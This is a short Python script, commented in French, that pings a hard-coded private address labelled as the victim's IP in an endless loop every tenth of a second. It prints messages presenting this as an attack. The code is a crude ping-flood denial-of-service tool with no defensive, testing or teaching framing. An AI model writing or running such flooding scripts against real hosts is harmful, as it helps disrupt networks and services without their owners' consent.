import os
import time

target = "172.20.89.184"  # IP de la victime

print(f"[+] Envoi de ping en boucle vers {target}")
try:
    while True:
        os.system(f"ping -c 1 {target}")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[!] Attaque arrêtée manuellement.")
